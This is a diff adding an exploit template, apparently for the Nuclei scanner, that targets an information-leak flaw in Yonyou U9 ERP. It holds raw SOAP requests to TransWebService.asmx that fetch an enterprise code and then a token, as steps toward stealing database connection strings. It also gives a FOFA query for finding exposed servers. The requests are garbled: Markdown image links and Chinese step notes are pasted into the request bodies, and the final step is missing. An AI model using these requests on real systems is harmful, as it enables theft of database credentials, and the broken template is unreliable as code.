@@ -1,0 +1,26 @@
+id: poc-reoue35fwg61h1he
+info:
+  name: 用友U9 GetConnectionString存在信息泄露漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/reoue35fwg61h1he'
+  tags: info-leak,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: reoue35fwg61h1he
+    fofa: body="logo-u9.png"
+http:
+- raw:
+  - "POST /CS/Office/TransWebService.asmx HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate, br\nConnection: close\nCookie: .ASPXANONYMOUS=1trTf5ff2gEkAAAAMzU0N2I3ZjctYzg0OC00YWFmLTliZTEtNDI2NDc1YmYyMTc10; ASP.NET_SessionId=ntvjalpizrae22kebxy5tn0g\nUpgrade-Insecure-Requests: 1\nPriority: u=1\nSOAPAction: [http://tempuri.org/GetEnterprise](http://tempuri.org/GetEnterprise)\nContent-Type: text/xml;charset=UTF-8\n\n<soap:Envelope xmlns:soap=\"http://www.w3.org/2003/05/soap-envelope\" xmlns:tem=\"http://tempuri.org/\">\n   <soap:Header/>\n   <soap:Body>\n      <tem:GetEnterprise/>\n   </soap:Body>\n</soap:Envelope>\n![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1720947541619-8a11c81c-608c-4202-b356-85f9f9f210fb.png)\n2.使用上一步获取的code获取token\n1."
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - "POST /CS/Office/TransWebService.asmx HTTP/1.1\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate, br\nConnection: close\nCookie: .ASPXANONYMOUS=1trTf5ff2gEkAAAAMzU0N2I3ZjctYzg0OC00YWFmLTliZTEtNDI2NDc1YmYyMTc10; ASP.NET_SessionId=ntvjalpizrae22kebxy5tn0g\nUpgrade-Insecure-Requests: 1\nPriority: u=1\nSOAPAction: [http://tempuri.org/GetToken](http://tempuri.org/GetToken)\nContent-Type: text/xml;charset=UTF-8\nHost: {{Hostname}}\nContent-Length: 274\n\n<soap:Envelope xmlns:soap=\"http://www.w3.org/2003/05/soap-envelope\" xmlns:tem=\"http://tempuri.org/\">\n   <soap:Header/>\n   <soap:Body>\n      <tem:GetToken>\n         <!--type: string-->\n         <tem:endId>800</tem:endId>\n      </tem:GetToken>\n   </soap:Body>\n</soap:Envelope>\n![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1720947541936-7805d3f6-d446-4a6d-9dcf-6eb6ec85554c.png)\n3.使用token获取数据库连接信息"
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
